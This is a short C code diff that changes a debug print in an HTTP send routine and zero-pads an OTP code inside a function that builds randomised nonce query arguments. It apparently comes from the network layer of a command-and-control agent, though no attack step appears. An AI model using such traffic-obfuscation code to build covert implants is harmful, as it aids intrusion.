@@ -910,7 +910,7 @@ BOOL HttpSend
 	}
 
 	if (pEnvelope->pData != NULL) {
-		PrintFormatW(L"Write Envelope:\n");
+		PrintFormatA("Write Envelope:\n");
 		HexDump(pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer);
 	}
 	else {
@@ -1318,11 +1318,13 @@ LPSTR OtpQueryArgument
 	LPSTR lpTemp = NULL;
 	CHAR Key1;
 	CHAR Key2;
+	CHAR szOtpCode[9];
 
 	lpResult = ALLOC(100);
 	Key1 = szNonceQueryArgChars[GenRandomNumber32(0, lstrlenA(szNonceQueryArgChars))];
 	Key2 = szNonceQueryArgChars[GenRandomNumber32(0, lstrlenA(szNonceQueryArgChars))];
-	wsprintfA(lpResult, "%c%c=%lu", Key1, Key2, (DWORD)uOtpCode);
+	SecureZeroMemory(szOtpCode, sizeof(szOtpCode));
+	wsprintfA(lpResult, "%c%c=%08lu", Key1, Key2, (DWORD)uOtpCode);
 	for (i = 0; i < 3; i++) {
 		lpTemp = lpResult;
 		dwRandIdx = GenRandomNumber32(3, lstrlenA(lpTemp));
